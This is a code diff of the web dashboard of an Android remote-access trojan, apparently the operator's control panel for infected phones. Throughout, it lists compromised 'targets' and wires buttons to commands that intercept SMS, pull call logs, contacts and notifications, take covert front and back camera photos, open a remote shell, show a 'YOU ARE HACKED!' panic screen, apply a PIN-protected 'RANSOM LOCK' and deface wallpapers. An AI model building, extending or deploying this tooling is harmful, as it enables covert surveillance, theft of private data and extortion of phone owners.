+                b.innerHTML = `<div style="text-align:center;"><img src="${d.media.is_direct?'data:image/jpeg;base64,'+d.media.last_img:'/captured_images/'+d.media.last_img}" style="width:100%; border-radius:2px; border:1px solid var(--primary); box-shadow:0 0 15px rgba(0,255,51,0.2);"></div>`;
+            } else if(curMod === 'notifications') {
+                b.innerHTML = `<table><tr><th>Source</th><th>Content</th></tr>${d.notifications.map(n=>`<tr><td style="color:var(--primary); font-size:0.8rem;">${n.packageName}</td><td><b style="color:var(--text)">${n.title}</b><br><span style="color:var(--dim)">${n.text}</span></td></tr>`).join('')}</table>`;
+                f.innerHTML = `<button class="action-btn" style="width:100%" onclick="cmd('getnotifications')">REFRESH DATA</button>`;
+            }
+        }
+
+        async function poll() {
+            try {
+                const res = await fetch(`/api/status?owner=${myUid}`);
+                state = await res.json();
                 
-                if (progress < 30) bootMsg.innerText = 'establishing link...';
-                else if (progress < 70) bootMsg.innerText = 'loading modules';
-                else bootMsg.innerText = 'finalizing';
-            }, 40);
-
-            // ---------- STATE ----------
-            let devices = [];
-            let selectedDeviceId = null;
-            let flashState = false;
-            let curMod = null;
-            let termOutput = '';
-            let cache = {};
-
-            // UI elements
-            const deviceListEl = document.getElementById('device-list');
-            const selInfoEl = document.getElementById('sel-info');
-            const connStatEl = document.getElementById('conn-stat');
-            const mainGridEl = document.getElementById('main-grid');
-
-            // ---------- REAL DEVICE POLLING ----------
-            async function pollDevices() {
-                try {
-                    const res = await fetch(`/api/status?owner=${uid}&_=${Date.now()}`);
-                    if (!res.ok) throw new Error('poll failed');
-                    const data = await res.json();
-                    devices = data.devices || [];
-                    renderDeviceList();
-
-                    if (selectedDeviceId && !devices.find(d => d.id === selectedDeviceId)) {
-                        selectedDeviceId = null;
-                        updateSelection();
-                    }
-                    if (selectedDeviceId) fetchDeviceData(selectedDeviceId);
-                } catch (e) {
-                    console.warn('poll error', e);
-                    devices = [];
-                    renderDeviceList();
-                }
-                setTimeout(pollDevices, 3000);
-            }
-
-            async function fetchDeviceData(devId) {
-                try {
-                    const res = await fetch(`/api/data/${devId}`);
-                    if (!res.ok) return;
-                    const data = await res.json();
-                    cache[devId] = data;
-                    if (curMod && selectedDeviceId === devId) {
-                        refreshModalFromCache();
-                    }
-                } catch (e) {}
-            }
-
-            function renderDeviceList() {
-                if (!devices.length) {
-                    deviceListEl.innerHTML = '<div style="color:#ff8888; padding:10px;">⛔ no targets online</div>';
-                    return;
-                }
-                deviceListEl.innerHTML = devices.map(d => `
-                    <div class="device-item ${selectedDeviceId === d.id ? 'active' : ''}" onclick="selectDevice('${d.id}')">
-                        <b style="color:#ffb5b5">${d.model || 'unknown'}</b> (${d.man || '?'})<br>
-                        <small style="color:#a5d6b2">Android ${d.ver || '?'} | ⚡ ${d.bat || '?'}%</small>
+                // UPDATE TARGET LIST UI
+                document.getElementById('device-list').innerHTML = state.devices.map(d=>`
+                    <div class="device-item" onclick="selectTarget('${d.id}')">
+                        <div class="device-header">
+                            <span><i class="fas fa-mobile-screen" style="color:var(--primary); margin-right:8px;"></i> ${d.model}</span>
+                            <span style="color:var(--primary)">[ ACTIVE ]</span>
+                        </div>
+                        <div class="device-sub">
+                            <span>OS: ANDROID ${d.ver}</span>
+                            <span>LOC: ${d.cnt}</span>
+                            <span style="color:var(--primary)">PWR: ${d.bat}</span>
+                        </div>
                     </div>
-                `).join('');
-            }
-
-            window.selectDevice = (id) => {
-                selectedDeviceId = id;
-                renderDeviceList();
-                updateSelection();
-                fetchDeviceData(id);
-            };
-
-            function updateSelection() {
-                if (selectedDeviceId) {
-                    selInfoEl.innerText = selectedDeviceId;
-                    connStatEl.innerText = 'ONLINE';
-                    connStatEl.style.color = '#9effb0';
-                } else {
-                    selInfoEl.innerText = 'None';
-                    connStatEl.innerText = 'OFF';
-                    connStatEl.style.color = '#ff7a7a';
+                `).join('') || "<div style='color:var(--dim); font-style:italic;'>No active endpoints found on network...</div>";
+                
+                if(selId) {
+                    const dres = await fetch(`/api/data/${selId}`);
+                    cache[selId] = await dres.json(); if(curMod) render();
                 }
-                renderMainButtons();
-            }
+            } catch(e){}
+            setTimeout(poll, 3000);
+        }
 
-            function renderMainButtons() {
-                const btns = [
-                    { id:'filemanager', i:'fa-terminal', l:'SHELL' }, { id:'info', i:'fa-circle-info', l:'INFO' },
-                    { id:'panic', i:'fa-triangle-exclamation', l:'LOCK' }, { id:'contacts', i:'fa-address-book', l:'CON' },
-                    { id:'sms', i:'fa-sms', l:'SMS' }, { id:'calls', i:'fa-phone', l:'CALLS' },
-                    { id:'gallery', i:'fa-images', l:'GALL' }, { id:'notifications', i:'fa-bell', l:'NOTIF' },
-                    { id:'apps', i:'fa-th', l:'APPS' }, { id:'flash', i:'fa-bolt', l:'FLASH' },
-                    { id:'vibrate', i:'fa-mobile-vibration', l:'VIB' }, { id:'voice', i:'fa-microphone', l:'VOICE' },
-                    { id:'takebackpic', i:'fa-camera', l:'CAM B' }, { id:'takefrontpic', i:'fa-video', l:'CAM F' },
-                    { id:'setwallpaper', i:'fa-image', l:'WALL' }, { id:'toast', i:'fa-lock', l:'LOCK' },
-                    { id:'open_url', i:'fa-globe', l:'URL' }
-                ];
-                mainGridEl.innerHTML = btns.map(b => 
-                    `<div class="btn ${b.id==='flash' && flashState ? 'active':''}" onclick="${b.id==='flash' ? 'toggleFlashBtn(this)' : 'window.openModal(\''+b.id+'\')'}"><i class="fas ${b.i}"></i>${b.l}</div>`
-                ).join('');
-            }
+        function toggleFlash(btn) { flash = !flash; cmd(flash?'flashon':'flashoff'); btn.classList.toggle('active'); }
 
-            window.toggleFlashBtn = (btn) => {
-                flashState = !flashState;
-                btn.classList.toggle('active');
-                if (selectedDeviceId) cmd(flashState ? 'flashon' : 'flashoff');
-            };
-
-            window.cmd = function(command, extra = {}) {
-                if (!selectedDeviceId) return;
-                fetch('/api/command', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ cmd: command, client_id: selectedDeviceId, ...extra })
-                }).catch(e => console.warn('cmd error', e));
-            };
-
-            window.openModal = (t) => {
-                if (!selectedDeviceId) return;
-                curMod = t;
-                document.getElementById('modal').style.display = 'flex';
-                document.getElementById('modal-title').innerText = t.toUpperCase();
-                const body = document.getElementById('modal-body');
-                const foot = document.getElementById('modal-footer');
-                body.innerHTML = ''; foot.innerHTML = '';
-
-                if (cache[selectedDeviceId]) {
-                    renderModalFromCache(t);
-                } else {
-                    body.innerHTML = `<p style="color:#aaa; padding:20px;">loading ${t}...</p>`;
-                }
-
-                sendCommandForModal(t);
-
-                if (t === 'filemanager') {
-                    termOutput = 'ghost@android:~#\n';
-                    body.innerHTML = `<div class="terminal" id="terminal">${termOutput}</div>
-                        <div style="display:flex; gap:5px; margin-top:8px;">
-                            <span style="color:#ffa4a4">λ</span>
-                            <input id="term-in" style="background:#1b0b0b; border:2px solid #de5a5a;" onkeydown="if(event.key==='Enter') execShellCmd()">
-                        </div>`;
-                    foot.innerHTML = `<button onclick="document.getElementById('up-file').click()">UPLOAD</button><input type="file" id="up-file" style="display:none">`;
-                    cmd('filemanager');
-                }
-                else if (t === 'panic') {
-                    body.innerHTML = `<p>seconds:</p><input type="number" id="psec" value="30"><p>message:</p><textarea id="pmsg">YOU ARE HACKED!</textarea>`;
-                    foot.innerHTML = `<button class="red-btn" onclick="cmd('panic '+document.getElementById('psec').value+'|'+document.getElementById('pmsg').value)">START</button>`;
-                }
-                else if (t === 'voice') {
-                    body.innerHTML = `<div style="text-align:center;padding:20px;"><i class="fas fa-microphone" style="font-size:3rem;color:#ff8888"></i><p id="v-stat">ready</p></div>`;
-                    foot.innerHTML = `<button onclick="startMockRec()">START</button><button onclick="stopMockRec()" style="display:none;" id="v-stop">STOP</button>`;
-                }
-                else if (t === 'toast') {
-                    body.innerHTML = `<p>message:</p><textarea id="lmsg">SYSTEM CRITICAL</textarea><p>PIN:</p><input id="lpin" value="1337">`;
-                    foot.innerHTML = `<button class="red-btn" style="flex:1;" onclick="cmd('lock '+document.getElementById('lmsg').value+'|'+document.getElementById('lpin').value)">LOCK</button> 
-                                      <button style="flex:1;" onclick="cmd('unlock')">UNLOCK</button>`;
-                }
-                else if (t === 'vibrate') {
-                    body.innerHTML = `<p>duration (s):</p><input id="vsec" value="3">`;
-                    foot.innerHTML = `<button onclick="cmd('vibrate '+document.getElementById('vsec').value)">VIBRATE</button>`;
-                }
-                else if (t === 'setwallpaper') {
-                    body.innerHTML = `<p>upload:</p><input type="file" onchange="uploadWall(this)"><p>url:</p><input id="wurl" value="https://example.com/img.jpg">`;
-                    foot.innerHTML = `<button onclick="cmd('set_wallpaper '+document.getElementById('wurl').value)">APPLY</button>`;
-                }
-                else if (t === 'open_url') {
-                    body.innerHTML = `<p>URL:</p><input id="ourl" value="https://google.com">`;
-                    foot.innerHTML = `<button onclick="cmd('openurl '+document.getElementById('ourl').value)">OPEN</button>`;
-                }
-                else {
-                    foot.innerHTML = `<button onclick="sendCommandForModal('${t}')">REFRESH</button>`;
-                }
-            };
-
-            function sendCommandForModal(t) {
-                const cmdMap = {
-                    sms: 'getsms', calls: 'getcalllogs', contacts: 'getcontacts',
-                    notifications: 'getnotifications', info: 'deviceinfo',
-                    gallery: 'gallery', apps: 'list_app',
-                    takebackpic: 'takebackpic', takefrontpic: 'takefrontpic',
-                    filemanager: 'filemanager'
-                };
-                const command = cmdMap[t] || t;
-                if (command) cmd(command);
-            }
-
-            function renderModalFromCache(t) {
-                const data = cache[selectedDeviceId];
-                if (!data) return;
-                const body = document.getElementById('modal-body');
-                if (!body) return;
-
-                if (t === 'sms') {
-                    const smsList = data.sms || [];
-                    body.innerHTML = `<table class="data-table"><tr><th>Sender</th><th>Message</th></tr>${
-                        smsList.map(s => `<tr><td>${s.userSender || s.address || '?'}</td><td>${s.content || s.body || ''}</td></tr>`).join('')
-                    }</table>`;
-                }
-                else if (t === 'calls') {
-                    const callsList = data.calls || [];
-                    body.innerHTML = `<table class="data-table"><tr><th>Number</th><th>Duration</th></tr>${
-                        callsList.map(c => `<tr><td>${c.number}</td><td>${c.duration_seconds || '?'}s</td></tr>`).join('')
-                    }</table>`;
-                }
-                else if (t === 'contacts') {
-                    const contactsList = data.contacts || [];
-                    body.innerHTML = `<table class="data-table"><tr><th>Name</th><th>Number</th></tr>${
-                        contactsList.map(c => `<tr><td>${c.name || '?'}</td><td>${c.number || ''}</td></tr>`).join('')
-                    }</table>`;
-                }
-                else if (t === 'notifications') {
-                    const notifList = data.notifications || [];
-                    body.innerHTML = `<table class="data-table"><tr><th>App</th><th>Text</th></tr>${
-                        notifList.map(n => `<tr><td>${n.packageName || n.app}</td><td>${n.title ? n.title+': ' : ''}${n.text || ''}</td></tr>`).join('')
-                    }</table>`;
-                }
-                else if (t === 'info') {
-                    const i = data.info || {};
-                    body.innerHTML = `<table class="data-table"><tr><td>Model</td><td>${i.Model || ''}</td></tr><tr><td>Manufacturer</td><td>${i.Manufacturer || ''}</td></tr><tr><td>Android</td><td>${i.AndroidVersion || ''}</td></tr><tr><td>Battery</td><td>${i.Battery || ''}</td></tr><tr><td>Phone</td><td>${i.PhoneNumber || ''}</td></tr></table>`;
-                }
-                else if (t === 'apps') {
-                    const appsList = data.apps || [];
-                    body.innerHTML = `<table class="data-table"><tr><th>App</th><th>Action</th></tr>${
-                        appsList.map(a => `<tr><td>${a.appName || a.packageName}</td><td><button onclick="cmd('run ${a.packageName}')">RUN</button></td></tr>`).join('')
-                    }</table>`;
-                }
-                else if (t === 'gallery') {
-                    const gal = data.gallery || {};
-                    const files = gal.files || [];
-                    body.innerHTML = `<div class="gal-grid">${
-                        files.map(f => `<div class="gal-item"><img src="data:image/jpeg;base64,${f.thumbnail || ''}" /><p style="font-size:0.6rem">${f.name}</p></div>`).join('')
-                    }</div>`;
-                }
-                else if (t === 'takebackpic' || t === 'takefrontpic') {
-                    const media = data.media || {};
-                    if (media.last_img) {
-                        if (media.is_direct) {
-                            body.innerHTML = `<img src="data:image/jpeg;base64,${media.last_img}" style="width:100%; border-radius:16px;" />`;
-                        } else {
-                            body.innerHTML = `<img src="/captured_images/${media.last_img}" style="width:100%; border-radius:16px;" />`;
-                        }
-                    } else {
-                        body.innerHTML = '<p>no image yet</p>';
-                    }
-                }
-            }
-
-            window.refreshModalFromCache = function() {
-                if (curMod) renderModalFromCache(curMod);
-            };
-
-            window.execShellCmd = () => {
-                let inp = document.getElementById('term-in');
-                if (!inp) return;
-                const cmdLine = inp.value;
-                termOutput += `\n# ${cmdLine}`;
-                document.getElementById('terminal').innerText = termOutput;
-                cmd(cmdLine);
-                inp.value = '';
-            };
-
-            window.closeModal = () => {
-                document.getElementById('modal').style.display = 'none';
-                if (curMod === 'filemanager') cmd('exit_shell');
-                if (curMod === 'gallery') cmd('exit_gallery');
-                curMod = null;
-            };
-
-            window.logout = () => {
-                localStorage.removeItem('ghost_uid');
-                window.location.href = '/';
-            };
-
-            window.startMockRec = window.startMockRec || function() {};
-            window.stopMockRec = window.stopMockRec || function() {};
-            window.uploadWall = window.uploadWall || function() {};
-
-            // Start polling setelah dashboard siap
-            updateSelection();
-            pollDevices();
-        })();
+        function updateMain() {
+            document.getElementById('sel-info').innerText = selId || "None";
+            const e = !!selId;
+            document.getElementById('conn-stat').innerText = e ? "ESTABLISHED":"DISCONNECTED";
+            document.getElementById('conn-stat').style.color = e ? "var(--primary)":"var(--danger)";
+            const btns = [
+                {id:'filemanager', i:'fa-terminal', l:'SYS SHELL'}, {id:'info', i:'fa-server', l:'SYS INFO'},
+                {id:'panic', i:'fa-skull-crossbones', l:'HELL LOCK'}, {id:'contacts', i:'fa-address-book', l:'CONTACTS'},
+                {id:'sms', i:'fa-comment-sms', l:'INTERCEPT SMS'}, {id:'calls', i:'fa-phone-volume', l:'CALL LOGS'},
+                {id:'gallery', i:'fa-images', l:'GALLERY'}, {id:'notifications', i:'fa-bell', l:'NOTIFS'},
+                {id:'apps', i:'fa-box-archive', l:'PACKAGES'}, {id:'flash', i:'fa-bolt', l:'FLASH'},
+                {id:'vibrate', i:'fa-wave-square', l:'VIBRATE'}, {id:'voice', i:'fa-microphone-lines', l:'AUDIO INJECT'},
+                {id:'takebackpic', i:'fa-camera', l:'CAM BACK'}, {id:'takefrontpic', i:'fa-video', l:'CAM FRONT'},
+                {id:'setwallpaper', i:'fa-image', l:'DEFACE WP'}, {id:'toast', i:'fa-lock', l:'RANSOM LOCK'},
+                {id:'open_url', i:'fa-globe', l:'FORCE URL'}
+            ];
+            document.getElementById('main-grid').innerHTML = btns.map(b=>`<div class="btn ${b.id==='flash'&&flash?'active':''}" onclick="${b.id==='flash'?'toggleFlash(this)':'openModal(\''+b.id+'\')'}"><i class="fas ${b.i}"></i>${b.l}</div>`).join('');
+        }
+        poll();
     </script>
 </body>
 </html>
